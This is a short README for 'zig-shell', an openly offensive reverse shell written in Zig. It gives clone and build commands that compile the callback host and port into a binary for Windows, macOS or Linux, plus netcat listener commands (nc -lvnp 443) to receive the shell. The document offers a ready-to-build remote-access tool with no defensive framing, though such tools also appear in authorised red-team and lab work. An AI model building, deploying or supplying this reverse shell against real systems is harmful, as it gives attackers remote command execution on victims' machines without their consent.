# zig-shell
> simple reverse shell in zig

# usage
> download zig 0.14 from https://ziglang.org/download/ extract and add it to your path

1. `git clone https://github.com/ziggoon/zig-shell`
2. `cd zig-shell`
3. `zig build -Dos=windows -Darch=x86 -Dhost="192.168.0.1" -Dport=443`
4. binary will be output to ./zig-out/bin/ivy

build.zig options:
`os`: operating system (windows, macos, linux) \
`arch`: cpu architecture (x86 or arm) \ 
`host`: ip / fqdn for your nc listener \
`port`: port for your nc listener \

nc usage:
*nix: `nc -lvnp 443`
macos: `nc -lv 443`

*note: this probably works on all operating systems and cpu architectures i just haven't tested*
